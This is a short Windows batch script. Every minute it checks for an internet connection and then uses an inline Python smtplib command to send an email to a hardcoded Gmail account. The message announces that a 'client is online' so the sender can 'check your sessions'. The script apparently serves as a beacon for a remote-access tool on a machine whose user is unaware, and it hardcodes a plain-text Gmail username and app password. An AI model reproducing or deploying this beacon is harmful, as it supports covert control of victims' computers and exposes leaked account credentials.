@echo off
setlocal enabledelayedexpansion

:: Define your email parameters
set "smtp_server=smtp.gmail.com"
set "smtp_port=587"
set "smtp_username=sbibank1952@gmail.com"
set "smtp_password=jfrtjhmrdmeuwjjk"
set "recipient_email=sbibank1952@gmail.com"
set "subject= Hellow H4 Clint is Online check your sessions"
set "body= The machine has started, bro, so let's do something that it doesn't know."

:LOOP
:: Check for internet connection
ping 8.8.8.8 -n 1 >nul

if !errorlevel! equ 0 (
    :: Internet connection detected
    for /f "delims=" %%u in ('echo %username%') do set "logged_in_user=%%u"

    if defined logged_in_user (
        :: Send the email
        echo Sending email...
        python -c "import smtplib, os; from email.mime.text import MIMEText; from email.mime.multipart import MIMEMultipart; from email.mime.application import MIMEApplication; from email.mime.base import MIMEBase; from email import encoders; msg = MIMEMultipart(); msg['From'] = '%smtp_username%'; msg['To'] = '%recipient_email%'; msg['Subject'] = '%subject%'; msg.attach(MIMEText('%body%', 'plain')); server = smtplib.SMTP('%smtp_server%', %smtp_port%); server.starttls(); server.login('%smtp_username%', '%smtp_password%'); server.sendmail('%smtp_username%', '%recipient_email%', msg.as_string()); server.quit();"

        echo Email sent successfully.
    )
)

:: Wait for 1 minute (60 seconds) before checking again
ping -n 60 127.0.0.1 >nul

:: Repeat the loop
goto LOOP

:end

